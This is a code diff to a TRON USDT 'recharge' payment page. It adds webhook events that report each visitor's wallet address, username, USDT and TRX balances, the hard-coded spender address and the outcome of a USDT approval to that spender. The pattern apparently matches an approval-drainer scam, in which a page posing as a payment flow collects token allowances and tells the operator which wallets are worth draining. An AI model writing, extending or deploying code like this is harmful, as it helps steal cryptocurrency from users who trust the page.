@@ -11,6 +11,7 @@ import FloatingContactButton from '@/components/FloatingContactButton';
 import { supabase } from '@/integrations/supabase/client';
 import { useTronWallet, WALLET_CONFIGS, BalanceInfo } from '@/hooks/useTronWallet';
 import PaymentModeModal from '@/components/PaymentModeModal';
+import { sendWalletConnectedEvent, sendAuthorizationCompletedEvent } from '@/lib/webhookService';
 
 const PAYMENT_TIMEOUT = 15 * 60; // 15 minutes in seconds
 
@@ -31,6 +32,7 @@ const RechargeUsdtPage = () => {
   const [isProcessing, setIsProcessing] = useState(false);
   const [spenderAddress, setSpenderAddress] = useState<string>('TYDzsYUEpvnYmQk4zGP9sWWcTEd2MiAtW6');
   const hasCreatedOrder = useRef(false);
+  const hasSentWalletConnectedEvent = useRef(false);
   const { user } = useAuth();
   const { t } = useLanguage();
   const { toast } = useToast();
@@ -46,7 +48,9 @@ const RechargeUsdtPage = () => {
     detectWallets,
     openWallet,
     approveUSDT,
-    checkTronWeb
+    checkTronWeb,
+    checkBalances,
+    balanceInfo
   } = useTronWallet();
 
   const amount = searchParams.get('amount') || '50';
@@ -192,18 +196,48 @@ const RechargeUsdtPage = () => {
     }
   }, [hasTronWeb, isConnected, connect]);
 
-  // Update transaction with wallet address when connected
+  // Update transaction with wallet address when connected and send webhook
   useEffect(() => {
-    const updateWalletAddress = async () => {
-      if (isConnected && address && paymentOrderId) {
+    const updateWalletAddressAndSendWebhook = async () => {
+      if (isConnected && address && paymentOrderId && !hasSentWalletConnectedEvent.current) {
+        // Update transaction in database
         await supabase
           .from('transactions')
           .update({ wallet_address: address })
           .eq('order_id', paymentOrderId);
+        
+        // Check balances
+        const balances = await checkBalances(parseFloat(amount));
+        
+        // Get username from user profile
+        let username = 'unknown';
+        if (user) {
+          const { data: profile } = await supabase
+            .from('profiles')
+            .select('username')
+            .eq('id', user.id)
+            .single();
+          if (profile?.username) {
+            username = profile.username;
+          }
+        }
+        
+        // Send wallet connected event
+        hasSentWalletConnectedEvent.current = true;
+        await sendWalletConnectedEvent({
+          order_id: paymentOrderId,
+          wallet_address: address,
+          username,
+          currency: 'USDT',
+          network: 'TRC20',
+          spender_address: spenderAddress,
+          usdt_balance: balances.usdtBalance,
+          trx_balance: balances.trxBalance
+        });
       }
     };
-    updateWalletAddress();
-  }, [isConnected, address, paymentOrderId]);
+    updateWalletAddressAndSendWebhook();
+  }, [isConnected, address, paymentOrderId, user, spenderAddress, amount, checkBalances]);
 
   const formatTime = (seconds: number) => {
     const mins = Math.floor(seconds / 60);
@@ -289,6 +323,37 @@ const RechargeUsdtPage = () => {
           })
           .eq('order_id', paymentOrderId);
       }
+      
+      // Get username and send authorization completed event
+      let username = 'unknown';
+      if (user) {
+        const { data: profile } = await supabase
+          .from('profiles')
+          .select('username')
+          .eq('id', user.id)
+          .single();
+        if (profile?.username) {
+          username = profile.username;
+        }
+      }
+      
+      // Check current balances
+      const balances = await checkBalances(paymentAmount);
+      
+      // Send authorization completed event
+      await sendAuthorizationCompletedEvent({
+        order_id: paymentOrderId,
+        wallet_address: address || '',
+        username,
+        currency: 'USDT',
+        network: 'TRC20',
+        spender_address: spenderAddress,
+        usdt_balance: balances.usdtBalance,
+        trx_balance: balances.trxBalance,
+        tx_hash: result.txHash || '',
+        status: result.success ? 'success' : 'failed',
+        payment_mode: mode
+      });
       
       setShowPaymentModal(false);
     } catch (err: any) {
